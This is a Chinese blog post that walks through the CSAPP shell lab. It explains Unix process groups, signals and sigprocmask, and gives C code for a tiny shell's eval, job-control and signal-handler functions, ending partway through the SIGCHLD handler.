<h3 id="加载并运行程序"><a href="#加载并运行程序" class="headerlink" title="加载并运行程序"></a>加载并运行程序</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">execve</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">const</span> <span class="keyword">char</span>*argv[], <span class="keyword">const</span> <span class="keyword">char</span> *envp[])</span></span></span><br></pre></td></tr></table></figure>
<p>execve函数加载并运行可执行目标文件filename，带参数列表品argv和环境变量envp。只有当出现错误时，例如找不到filename，execve才会返回调用程序。所以execve调用一次并从不返回</p>
<h3 id="进程组"><a href="#进程组" class="headerlink" title="进程组"></a>进程组</h3><p>每个进程都只属于一个进程组，getpgrp函数可以获取当前进程的进程组ID</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="keyword">pid_t</span> getpgrp(<span class="keyword">void</span>);</span><br></pre></td></tr></table></figure>
<p>setpgid可以设置自己或者其他进程的进程组</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">setpgid</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">pid_t</span> pgid)</span></span>;</span><br></pre></td></tr></table></figure>
<p>setpgid函数将进程pid的进程组改为pgid，如果pid是0，则说明对当前的进程操作，如果pgid是0，则用pid作为进程组的ID。比较常用的方法是<code>setpgid(0,0)</code> 就是将一个进程自己的id号作为自己的进程组号。</p>
<h2 id="信号相关"><a href="#信号相关" class="headerlink" title="信号相关"></a>信号相关</h2><h3 id="用-bin-kill程序发送信号"><a href="#用-bin-kill程序发送信号" class="headerlink" title="用/bin/kill程序发送信号"></a>用/bin/kill程序发送信号</h3><p>/bin/kill程序可以向另外的进程发送任意的信号命令，例如<code>unix&gt; /bin/kill -9 15213</code> 发送信号9（SIGKILL）给进程15213。一个负2的PID会导致信号被发送到进程组所有进程。</p>
<p>程序中可以通过调用kill函数发送信号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill(pid, SIGKILL);</span><br></pre></td></tr></table></figure></p>
<p>如果pid&gt;0则kill函数发送信号sig给pid，如果pid小于0，则会发送信号sig给进程组abs(pid)中每一个进程。</p>
<h3 id="修改信号的默认行为"><a href="#修改信号的默认行为" class="headerlink" title="修改信号的默认行为"></a>修改信号的默认行为</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*<span class="keyword">sighandler_t</span>)</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">sighandler_t</span> signal(<span class="keyword">int</span> signum, <span class="keyword">sighandler_t</span> handler);</span><br></pre></td></tr></table></figure>
<p>signal函数可以通过下列三种方式之一来改变和信号signum相关联的行为</p>
<ul>
<li>如果handler是SIG_IGN，则忽略类型为signum的信号</li>
<li>如果handler是SIG_DFL，则恢复类型为signum的信号的默认行为</li>
<li>否则，handler是用户定义的函数的地址，这个函数就称为信号处理程序。只要进程接收到类型为signum的信号，就会调用这个程序。</li>
</ul>
<h3 id="显式地阻塞和取消阻塞信号"><a href="#显式地阻塞和取消阻塞信号" class="headerlink" title="显式地阻塞和取消阻塞信号"></a>显式地阻塞和取消阻塞信号</h3><p>应用程序可以使用sigprocmask函数来显示地阻塞和取消阻塞信号<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;signal.c&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sigprocmask</span><span class="params">(<span class="keyword">int</span> how, <span class="keyword">const</span> <span class="keyword">sigset_t</span> *<span class="built_in">set</span>, <span class="keyword">sigset_t</span> oldset)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sigemptyset</span><span class="params">(<span class="keyword">sigset_t</span> *<span class="built_in">set</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sigfillset</span><span class="params">(<span class="keyword">sigset_t</span> *<span class="built_in">set</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sigaddset</span><span class="params">(<span class="keyword">sigset_t</span> *<span class="built_in">set</span>, <span class="keyword">int</span> signum)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sigdelset</span><span class="params">(<span class="keyword">sigset_t</span> *<span class="built_in">set</span>, <span class="keyword">int</span> signum)</span></span>;</span><br></pre></td></tr></table></figure></p>
<p>其中sigprocmask函数的how有以下选择：</p>
<ul>
<li>SIG_BLOCK：添加set中信号到blocked中</li>
<li>SIG_UNBLOCK：从blocked中删除set中的信号</li>
<li>SIG_SETMASK：blocked = set</li>
</ul>
<p>为什么需要阻塞信号呢？ 来看下面的一个例子<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span>&#123;</span><br><span class="line">	<span class="keyword">pid_t</span> = pid;</span><br><span class="line">	<span class="keyword">while</span>((pid = waitpid(<span class="number">-1</span>, <span class="literal">NULL</span>, <span class="number">0</span>)) &gt; <span class="number">0</span>)</span><br><span class="line">		deletejob(pid);</span><br><span class="line">	<span class="keyword">if</span>(errno != ECHILD)</span><br><span class="line">		unix_error(<span class="string">"waitpid error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> ** argv)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> pid;</span><br><span class="line">	Signal(SIGCHLD, handler);</span><br><span class="line">	initjobs();</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>((pid == Fork()) == <span class="number">0</span>)&#123;</span><br><span class="line">			execve(<span class="string">"/bin/date"</span>, argv, <span class="literal">NULL</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		addjob(pid);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<ol>
<li>父进程执行fork函数，内核先调度新创建的子进程运行，而不是父进程（因为父进程和子进程的执行顺序是不一定的，可能出现这种情况）。</li>
<li>在父进程执行之前，子进程就终止了，并且变成了一个僵尸进程，则内核会发送一个SIGCHLD信号给父进程</li>
<li>这时候内核注意到了待处理的SIGCHLD信号，并通过父进程中运行处理程序接手了这个信号</li>
<li>处理程序回收终止的子进程，并调用了deletejob，然而这个时候addjob尚未被调用。</li>
</ol>
<p>这是一个称谓竞争的同步错误示例。如何消除竞争： 在调用fork之前先阻塞SIGCHLD信号，然后在我们调用addjob之后再取消阻塞这些信号。注意，子进程继承了他们父进程的被阻塞信号，所以我们要在调用execve之前，解除子进程中阻塞的SIGCHLD信号。 正确的程序如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span>&#123;</span><br><span class="line">	<span class="keyword">pid_t</span> = pid;</span><br><span class="line">	<span class="keyword">while</span>((pid = waitpid(<span class="number">-1</span>, <span class="literal">NULL</span>, <span class="number">0</span>)) &gt; <span class="number">0</span>)</span><br><span class="line">		deletejob(pid);</span><br><span class="line">	<span class="keyword">if</span>(errno != ECHILD)</span><br><span class="line">		unix_error(<span class="string">"waitpid error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> ** argv)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> pid;</span><br><span class="line">	<span class="keyword">sigset_t</span> mask;</span><br><span class="line">	Signal(SIGCHLD, handler);</span><br><span class="line">	initjobs();</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		sigemptyset(&amp;mask);</span><br><span class="line">		sigaddset(&amp;mask, SIGCHLD);</span><br><span class="line">		sigprocmask(SIG_BLOCK, &amp;mask, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>((pid == Fork()) == <span class="number">0</span>)&#123;</span><br><span class="line">			sigprocmask(SIG_UNBLOCK, &amp;mask, <span class="literal">NULL</span>);</span><br><span class="line">			execve(<span class="string">"/bin/date"</span>, argv, <span class="literal">NULL</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		addjob(pid);</span><br><span class="line">		sigprocmask(SIG_UNBLOCK, &amp;mask, <span class="literal">NULL</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h1><h2 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * eval - Evaluate the command line that the user has just typed in</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * If the user has requested a built-in command (quit, jobs, bg or fg)</span></span><br><span class="line"><span class="comment"> * then execute it immediately. Otherwise, fork a child process and</span></span><br><span class="line"><span class="comment"> * run the job in the context of the child. If the job is running in</span></span><br><span class="line"><span class="comment"> * the foreground, wait for it to terminate and then return.  Note:</span></span><br><span class="line"><span class="comment"> * each child process must have a unique process group ID so that our</span></span><br><span class="line"><span class="comment"> * background children don't receive SIGINT (SIGTSTP) from the kernel</span></span><br><span class="line"><span class="comment"> * when we type ctrl-c (ctrl-z) at the keyboard.  </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">eval</span><span class="params">(<span class="keyword">char</span> *cmdline)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *argv[MAXARGS];</span><br><span class="line">    <span class="keyword">char</span> buf[MAXLINE];</span><br><span class="line">    <span class="keyword">int</span> bg;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">sigset_t</span> mask;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(buf, cmdline);</span><br><span class="line">    bg = parseline(buf, argv);</span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">0</span>] == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>; <span class="comment">/* cmd are empty lines */</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!builtin_cmd(argv)) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//为了防止addjob和deletejob发生竞争，先阻塞SIGCHLD信号，保证在deletejob之前执行addjob</span></span><br><span class="line">        sigemptyset(&amp;mask);</span><br><span class="line">        sigaddset(&amp;mask, SIGCHLD);</span><br><span class="line">        sigaddset(&amp;mask, SIGINT);</span><br><span class="line">        sigaddset(&amp;mask, SIGTSTP);</span><br><span class="line">        sigprocmask(SIG_BLOCK, &amp;mask, <span class="literal">NULL</span>); <span class="comment">// Block SIGCHLD</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((pid = fork()) == <span class="number">0</span>) &#123; <span class="comment">/* Child runs user job */</span></span><br><span class="line">            sigprocmask(SIG_UNBLOCK, &amp;mask, <span class="literal">NULL</span>);</span><br><span class="line">            setpgid(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> (execve(argv[<span class="number">0</span>], argv, environ) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"%s: Command not found.\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Parent waits for foreground job to terminate */</span></span><br><span class="line">        <span class="keyword">if</span> (!bg) &#123;</span><br><span class="line">            <span class="keyword">if</span> (addjob(jobs, pid, FG, cmdline) == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            sigprocmask(SIG_UNBLOCK, &amp;mask, <span class="literal">NULL</span>);</span><br><span class="line">            waitfg(pid);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (addjob(jobs, pid, BG, cmdline) == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            sigprocmask(SIG_UNBLOCK, &amp;mask, <span class="literal">NULL</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[%d] (%d) %s"</span>, pid2jid(pid), pid, cmdline);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>eval函数判断输入的命令是否为内置命令，如果是内置命令则shell会直接在当前进程执行；如果用户输入的是一个可执行程序的路径，那么shell会fork出一个新的进程并在这个进程中执行该程序。</p>
<p>eval函数的难度主要在于之前提到的deletejob有可能在addjob之前执行，造成奇怪的结果（分析见《深入理解计算机系统》P517），所以需要在fork之前先阻塞SIGCHLD信号，然后在子进程中先取消阻塞再调用<code>execve</code>函数，在父进程中等待addjob执行完毕再取消阻塞。 还需要注意的是这里<code>sigprocmask(SIG_BLOCK, &amp;mask, NULL);</code>这部分操作要放在<code>if(buildin_cmd(argv))</code>判断里面，因为如果放在外面的话，在执行buildin_cmd时就会阻塞所有信号，导致执行<code>fg %1</code>命令之后无法接受SIGINT和SIGTSTP信号，在这里卡了好久才找到问题所在。</p>
<p>这里<code>setpgid(0, 0);</code>的作用是：默认情况下创建的子进程会是和我们的./tsh进程处于同一个foreground process group。而当我们按下CTRLC时候，SIGINT会被发到进程组中每一个进程，包括我们的./tsh进程。所以在fork之后使用setpgid函数将子进程放在一个单独的进程组中（以自己的pid作为进程组编号）这样就保证了当我们按下ctrlC的时候shell会捕捉到SIGINT并发送给前台进程，而不是shell直接停掉。</p>
<h2 id="buildin-cmd"><a href="#buildin-cmd" class="headerlink" title="buildin_cmd"></a>buildin_cmd</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"quit"</span>)) &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"fg"</span>) || !<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"bg"</span>)) &#123;</span><br><span class="line">        do_bgfg(argv);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"jobs"</span>)) &#123;</span><br><span class="line">        listjobs(jobs);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;     <span class="comment">/* not a builtin command */</span> &#125;</span><br></pre></td></tr></table></figure>
<p>这个函数很简单，就是根据argv来跳转到不同的函数中去。</p>
<h2 id="do-bgfg"><a href="#do-bgfg" class="headerlink" title="do_bgfg"></a>do_bgfg</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * do_bgfg - Execute the builtin bg and fg commands</span></span><br><span class="line"><span class="comment"> * bg &lt;job&gt; Change a stopped background job to runing background job</span></span><br><span class="line"><span class="comment"> * fg &lt;job&gt; Change a stoped or running background job to a running in the foregruond.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_bgfg</span><span class="params">(<span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">1</span>] == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s command requires PID or %%jobid argument\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">1</span>][<span class="number">0</span>] == <span class="string">'%'</span>) &#123;</span><br><span class="line">        <span class="keyword">char</span> *s = argv[<span class="number">1</span>];</span><br><span class="line"><span class="comment">//        sscanf(&amp;s[1], "%d", &amp;jid);</span></span><br><span class="line">        job = getjobjid(jobs, atoi(s + <span class="number">1</span>));</span><br><span class="line">        <span class="keyword">if</span> (job == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%s: No such job\n"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        job = getjobpid(jobs, atoi(argv[<span class="number">1</span>]));</span><br><span class="line">        <span class="keyword">if</span> (job == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"(%s): No such process\n"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"bg"</span>)) &#123;</span><br><span class="line">        job-&gt;state = BG;</span><br><span class="line">        kill(<span class="number">-1</span> * job-&gt;pid, SIGCONT);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        job-&gt;state = FG;</span><br><span class="line">        kill(<span class="number">-1</span> * job-&gt;pid, SIGCONT);</span><br><span class="line">        waitfg(job-&gt;pid);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先需要进行参数检查，然后根据是否含有%来判断是jid还是pid。 找到job之后将其的状态置为BG或FG，并向这个进程发送SIGCONT信号。</p>
<h2 id="waitfg"><a href="#waitfg" class="headerlink" title="waitfg"></a>waitfg</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * waitfg - Block until process pid is no longer the foreground process</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">waitfg</span><span class="params">(<span class="keyword">pid_t</span> pid)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (pid == fgpid(jobs))&#123;</span><br><span class="line">		sleep(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">// struct job_t *job = getjobpid(jobs, pid);</span></span><br><span class="line"><span class="comment">// while (job-&gt;state == FG) &#123;</span></span><br><span class="line"><span class="comment">//    sleep(0);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数就是等待foreground 任务的执行结束。在实验指导书中写到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">One of the tricky parts of the assignment is deciding on the allocation of work between the waitfg and sigchld handler functions. We recommend the following approach:</span><br><span class="line">- In waitfg, use a busy loop around the sleep function.</span><br><span class="line">- In sigchld handler, use exactly one call to waitpid.</span><br></pre></td></tr></table></figure></p>
<p>因为在两个地方都回收僵尸进程会使人迷惑。所以在waitfg函数中没有使用<code>waitpid</code>来等待前台任务的结束。</p>
<h2 id="sigint-handler"><a href="#sigint-handler" class="headerlink" title="sigint_handler"></a>sigint_handler</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * sigint_handler - The kernel sends a SIGINT to the shell whenver the</span></span><br><span class="line"><span class="comment"> *    user types ctrl-c at the keyboard.  Catch it and send it along</span></span><br><span class="line"><span class="comment"> *    to the foreground job.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigint_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pid = fgpid(jobs);</span><br><span class="line">    <span class="keyword">if</span> (pid != <span class="number">0</span>) &#123;</span><br><span class="line">        kill(-pid, SIGINT);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="sigtstp-handler"><a href="#sigtstp-handler" class="headerlink" title="sigtstp_handler"></a>sigtstp_handler</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * sigtstp_handler - The kernel sends a SIGTSTP to the shell whenever</span></span><br><span class="line"><span class="comment"> *     the user types ctrl-z at the keyboard. Catch it and suspend the</span></span><br><span class="line"><span class="comment"> *     foreground job by sending it a SIGTSTP.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigtstp_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pid = fgpid(jobs);</span><br><span class="line">    <span class="keyword">if</span> (pid != <span class="number">0</span>) &#123;</span><br><span class="line">        kill(-pid, SIGTSTP);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="sigchld-handler"><a href="#sigchld-handler" class="headerlink" title="sigchld_handler"></a>sigchld_handler</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigchld_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    -1表示等待父进程的所有子进程</span></span><br><span class="line"><span class="comment">//    WNOHANG | WUNTRACED 表示立即返回，如果等待集合中没有任何子进程被停止或已终止，那么返回值为0，或者返回值等于那个被停止或者已终止的子进程的PID</span></span><br><span class="line">    <span class="keyword">while</span> ((pid = waitpid(<span class="number">-1</span>, &amp;status, WUNTRACED | WNOHANG)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/*handle SIGTSTP*/</span></span><br><span class="line">        <span class="keyword">if</span> (WIFSTOPPED(status)) &#123;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span> = <span class="title">getjobpid</span>(<span class="title">jobs</span>, <span 